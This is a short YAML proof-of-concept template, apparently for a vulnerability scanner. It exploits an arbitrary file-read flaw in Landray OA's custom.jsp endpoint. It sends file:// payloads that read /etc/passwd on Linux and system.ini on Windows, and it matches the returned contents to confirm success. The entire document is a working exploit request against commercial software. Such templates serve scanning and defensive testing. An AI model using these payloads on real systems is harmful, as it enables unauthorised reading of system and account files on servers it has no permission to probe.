name: poc-yaml-landray-fileread
groups:
  linux:
    - method: POST
      path: "/sys/ui/extend/varkind/custom.jsp"
      body: |
        var={"body":{"file":"file:///etc/passwd"}}
      expression: |
        response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
  windows:
    - method: GET
      path: "/sys/ui/extend/varkind/custom.jsp"
      body: |
        var={"body":{"file":"file:///C:\Windows\system.ini"}}
      expression: |
        response.status == 200 && response.body.bcontains(b"for 16-bit app support")
detail:
  author: dacAIniao(https://github.com/wudicainiao)
  links: http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8COA%20SSRF+JNDI%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html
